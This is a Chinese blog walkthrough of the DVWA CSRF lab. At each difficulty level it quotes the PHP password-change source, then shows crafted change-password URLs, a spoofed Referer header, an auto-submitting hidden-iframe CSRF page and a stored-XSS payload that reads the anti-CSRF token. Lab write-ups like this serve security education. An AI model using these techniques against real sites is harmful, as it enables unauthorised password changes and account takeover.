**目录**

[Low](#t0)

[Middle](#t1)

[High](#t2)

[Impossible](#t3)

* * *

Low
---

源代码：

```
<?php      
if( isset( $_GET[ 'Change' ] ) ) {      
    // Get input      
    $pass_new  = $_GET[ 'password_new' ];          
    $pass_conf = $_GET[ 'password_conf' ];      
    // Do the passwords match?      
    if( $pass_new == $pass_conf ) {      
        // They do!      
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      1
        $pass_new = md5( $pass_new );      1
        // Update the database      1
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";      1
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );      1
        // Feedback for the user      1
        echo "<pre>Password Changed.</pre>";      1
    }      1
    else {      1
        // Issue with passwords matching      1
        echo "<pre>Passwords did not match.</pre>";      2
    }      2
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);      2
}      2
?>
```


$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS\[index\] 的数组中存储了所有全局变量。变量的名字就是数组的键。

从源代码可以看出这里只是对用户输入的两个密码进行判断，看是否相等。不相等就提示密码不匹配。

相等的话，查看有没有设置数据库连接的全局变量和其是否为一个对象。如果是的话，用mysqli\_real\_escape\_string（）函数去转义一些字符，如果不是的话输出错误。

是同一个对象的话，再用md5进行加密，再更新数据库。

知道了这些之后，我们第一次尝试两次秘密不一致看看。

![](https://img-blog.csdn.net/20181001204400904?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

可以看到顶部的URL是：[http://127.0.0.1/vulnerabilities/csrf/?password\_new=123&password\_conf=124&Change=Change#](http://127.0.0.1/vulnerabilities/csrf/?password_new=123&password_conf=124&Change=Change#)

很明显，这就是修改密码的链接。

我们打开另一个页面，在顶部URL中自己输入如下的

[http://127.0.0.1/vulnerabilities/csrf/?password\_new=abc&password\_conf=abc&Change=Change#](http://127.0.0.1/vulnerabilities/csrf/?password_new=123&password_conf=124&Change=Change#)

可以看到，直接跳转到了密码成功的页面了

![](https://img-blog.csdn.net/20181001204603883?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

Middle
------

源代码：

```
<?php       
if( isset( $_GET[ 'Change' ] ) ) {      
    // Checks to see where the request came from      
    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {      
        // Get input      
        $pass_new  = $_GET[ 'password_new' ];      
        $pass_conf = $_GET[ 'password_conf' ];      
        // Do the passwords match?      1
        if( $pass_new == $pass_conf ) {      1
            // They do!      1
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      1
            $pass_new = md5( $pass_new );      1
            // Update the database      1
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";      1
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );      1
            // Feedback for the user      1
            echo "<pre>Password Changed.</pre>";      1
        }      2
        else {      2
            // Issue with passwords matching      2
            echo "<pre>Passwords did not match.</pre>";      2
        }      2
    }      2
    else {      2
        // Didn't come from a trusted source      2
        echo "<pre>That request didn't look correct.</pre>";      2
    }      2
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);      3
}      3
?>
```


Middle类型的代码在Low级别的基础上，加上了对用户请求头的中的Referer字段进行验证

```
if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
```


即用户的请求头中的Referer字段必须包含了服务器的名字。关于Http Referer字段，详情：[验证 HTTP Referer 字段](https://blog.csdn.net/qq_36119192/article/details/82820115#%EF%BC%881%EF%BC%89%E9%AA%8C%E8%AF%81%20HTTP%20Referer%20%E5%AD%97%E6%AE%B5%20%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0) 

当我们再打开另一个页面，在顶部URL中自己输入如下的时，

[http://127.0.0.1/vulnerabilities/csrf/?password\_new=abc&password\_conf=abc&Change=Change#](http://127.0.0.1/vulnerabilities/csrf/?password_new=123&password_conf=124&Change=Change#)

它会报错，提示你Http Referer字段没有定义索引

![](https://img-blog.csdn.net/20181001205905375?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

 这次我们先正常的访问这个完整，然后用burpsuite进行抓包，如图可以看到Referer字段

![](https://img-blog.csdn.net/2018100122124229?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

然后，我们打开另一个页面，在顶部URL中自己输入如下的链接，用burpsuite进行抓包

[http://127.0.0.1/vulnerabilities/csrf/?password\_new=abc&password\_conf=abc&Change=Change#](http://127.0.0.1/vulnerabilities/csrf/?password_new=123&password_conf=124&Change=Change#)

可以看到，当我们直接打开另一个页面，直接输入URL的时候，请求包的头中并没有Referer字段，所以不能修改成功。

![](https://img-blog.csdn.net/20181001221436899?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

 那我们可以自己加一个Referer字段，然后值只要设置成包含了主机头127.0.0.1就行了

![](https://img-blog.csdnimg.cn/20190124185640988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看到，已经成功修改密码了

![](https://img-blog.csdn.net/20181001221716796?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

High
----

源代码：

```
 <?php      
if( isset( $_GET[ 'Change' ] ) ) {      
    // Check Anti-CSRF token      
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );      
    // Get input      
    $pass_new  = $_GET[ 'password_new' ];      
    $pass_conf = $_GET[ 'password_conf' ];      
    // Do the passwords match?      
    if( $pass_new == $pass_conf ) {      1
        // They do!      1
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      1
        $pass_new = md5( $pass_new );      1
        // Update the database      1
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";      1
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );      1
        // Feedback for the user      1
        echo "<pre>Password Changed.</pre>";      1
    }      1
    else {      2
        // Issue with passwords matching      2
        echo "<pre>Passwords did not match.</pre>";      2
    }      2
    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);      2
}      2
// Generate Anti-CSRF token      2
generateSessionToken();      2
?>
```


可以看到，High级别的代码加入了Anti-[CSRF](https://so.csdn.net/so/search?q=CSRF&spm=1001.2101.3001.7020) token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。这里因为对请求的token进行了验证，所以比上两个等级的更加的安全。关于 token 抵御CSRF攻击，详情：[在请求地址中添加 token 并验证](https://blog.csdn.net/qq_36119192/article/details/82820115#%EF%BC%882%EF%BC%89%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%9C%B0%E5%9D%80%E4%B8%AD%E6%B7%BB%E5%8A%A0%20token%20%E5%B9%B6%E9%AA%8C%E8%AF%81%20%C2%A0%20%C2%A0%20%C2%A0%20%C2%A0)

因为该请求是get请求，所以token验证会被放在请求URL中，我们随便输入密码验证一下，可以看到，在请求的URL中最末尾加入了token。

![](https://img-blog.csdn.net/20181001223036920?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

所以现在要想进行CSRF攻击就必须获取到用户的token，而要想获取到 token 就必须利用用户的 cookie 值去访问修改密码的页面，然后截取服务器返回的token值。然后再利用CSRF漏洞构造URL进行密码的修改。

我们尝试利用下面的代码去构造一个页面，诱使用户点击，当用户点击该链接的这一刻，该代码会偷偷的访问修改用户密码的页面，然后获取到服务器返回的 token ，然后再构造修改密码的表单，加上我们获取到服务器的token值，向服务器发送修改密码的请求。

```
<!DOCTYPE html>      
<html>      
<head lang="en">      
    <meta charset="UTF-8">      
    <title></title>      
    <script type="text/javascript">      
        //获取用户的token，并设置为表单中的token，然后提交修改密码的表单      
        function attack()      
        {      1
            document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;      1
            document.getElementById("transfer").submit();      1
        }      1
    </script>      1
</head>      1
<body onload="attack()">      1
    <iframe src="http://192.168.10.14/dvwa/vulnerabilities/csrf/" id="hack"  style="display:none;">  <!--在该网页内打开另一个网页-->      1
    </iframe>      1
    <form method="GET" id="transfer"  action="http://192.168.10.14/dvwa/vulnerabilities/csrf/">      1
        <input type="hidden" name="password_new" value="admin">      2
        <input type="hidden" name="password_conf" value="admin">      2
        <input type="hidden" name="user_token" value="">      2
        <input type="hidden" name="Change" value="Change">      2
    </form>      2
</body>      2
</html>
```


这一切看起来是那么的天衣无缝，无懈可击。可是，我们忘记了浏览器最重要的一个策略——同源策略。由于我们框架ifame要访问的链接是 [http://192.168.10.14/dvwa/vulnerabilities/csrf](http://192.168.153.130/dvwa/vulnerabilities/csrf) ，这是漏洞网站服务器的链接。而我们的脚本执行的位置是我们自己搭的一个服务器，所以我们的攻击脚本是不可能跨域取到改密界面中的user\_token。关于同源策略和跨域问题：[浏览器同源策略和跨域的实现方法](https://blog.csdn.net/qq_36119192/article/details/82931250)

![](https://img-blog.csdnimg.cn/20181120191825968.png)

由于这里跨域是不能实现的，所以我们之前的想法以失败告终了。

在这里，我们要想获取到用户的token,并提交修改密码的表单的话，就必须得把我们的攻击脚本注入到目标服务器中 。而要想注入到目标服务器，同时得发挥作用，获取用户的 token修改密码的话，就得和XSS漏洞一起结合实现了。

我们将如下代码通过存储型XSS插入到数据库中，这语句会弹出用户的token

```
<iframe src="../csrf/" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)></iframe>
```


Impossible
----------

源代码：

```
<?php      
if( isset( $_GET[ 'Change' ] ) ) {      
    // Check Anti-CSRF token      
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );      
    // Get input      
    $pass_curr = $_GET[ 'password_current' ];      
    $pass_new  = $_GET[ 'password_new' ];      
    $pass_conf = $_GET[ 'password_conf' ];      
    // Sanitise current password input      1
    $pass_curr = stripslashes( $pass_curr );      1
    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      1
    $pass_curr = md5( $pass_curr );      1
    // Check that the current password is correct      1
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );      1
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );      1
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );      1
    $data->execute();      1
    // Do both new passwords match and does the current password match the user?      1
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {      2
        // It does!      2
        $pass_new = stripslashes( $pass_new );      2
        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      2
        $pass_new = md5( $pass_new );      2
        // Update database with new password      2
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );      2
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );      2
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );      2
        $data->execute();      2
        // Feedback for the user      3
        echo "<pre>Password Changed.</pre>";      3
    }      3
    else {      3
        // Issue with passwords matching      3
        echo "<pre>Passwords did not match or current password incorrect.</pre>";      3
    }      3
}      3
// Generate Anti-CSRF token      3
generateSessionToken();      3
?>
```


可以看出，impossible级别修改密码需要输入之前的密码，黑客无法知道用户之前的密码，所以无法进行CSRF攻击。